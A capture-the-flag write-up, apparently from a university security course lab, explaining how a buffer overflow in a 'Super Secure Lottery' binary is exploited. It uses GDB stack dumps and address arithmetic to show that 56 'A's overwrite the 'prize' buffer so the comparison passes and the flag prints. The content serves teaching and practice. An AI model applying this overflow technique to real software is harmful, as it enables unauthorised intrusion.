# Challenge `Super Secure Lottery` writeup

- Vulnerability: Buffer Overflow
- Where: function `read()` when reading from *stdin*
- Impact: This function doesn't do any kind of input validation or bounds checking while getting bytes from *stdin*, which allows us to enter more than the maximum 8 characters allocated for the variable *guess*, causing it to write in memory that was not allocated for, in this case the content of the *prize* variable which is read from a file

## Steps to reproduce

1. Using GDB if we put a breakpoint somewhere in the function `run_lottery()` we can check the address of the variable *prize* and check its content which we want to overwrite:

(gdb) p &prize
$4 = (const char **) 0xffffce5c

2. If we check what's on that address we get `0xffffce94`:

0xffffce40:     0x00000000      0xffffce64      0x00000040      0x0804875d
0xffffce50:     0xffffcea8      0x0804a000      0xf7fb4000      0xffffce94

3. So the content of the variable *prize* must be at the address `0xffffce94`and `0xffffce98` because it has size 8 which corresponds to these 2 blocks `0x0b26db30 0xc9ddfc76`:

0xffffce90:     0x00000003      0x0b26db30      0xc9ddfc76      0xdb8e8d00
0xffffcea0:     0xffffcec0      0x00000000      0x00000000      0xf7de6ee5

4. The address of the variable *guess* is:

(gdb) p &guess
$3 = (char (*)[8]) 0xffffce64

5. From `0xffffce64` to get to `0xffffce94` and `0xffffce98` we must write on 14 blocks which correspond to 56 'A's. This can be easly seen by printing the stack's content:

(gdb) x/30x $esp
0xffffce40:     0x00000000      0xffffce64      0x00000040      0x0804875d
0xffffce50:     0xffffcea8      0x0804a000      0xf7fb4000      0xffffce94
0xffffce60:     0xffffcea8      0x41414141      0x41414141      0xd366a60a
0xffffce70:     0x00000008      0x0804a000      0xffffcea8      0x0804885f
0xffffce80:     0xffffce94      0xffffce94      0x00000008      0x0804881a
0xffffce90:     0x00000003      0x7ff29173      0xd9d111d7      0xd366a600
0xffffcea0:     0xffffcec0      0x00000000      0x00000000      0xf7de6ee5

6. If we send this many 'A's, in funcion `memcmp()` we are comparing the first 8 characters of both *prize* and *guess* variables and both will have 8 'A's in the beginning so we will enter the *If* statement where the flag will be printed

This was done in python using Pwntools [here](https://gitlab.rnl.tecnico.ulisboa.pt/ssof2223/writeups/ist193342/-/blob/master/lab6/super_secure_lottery.py)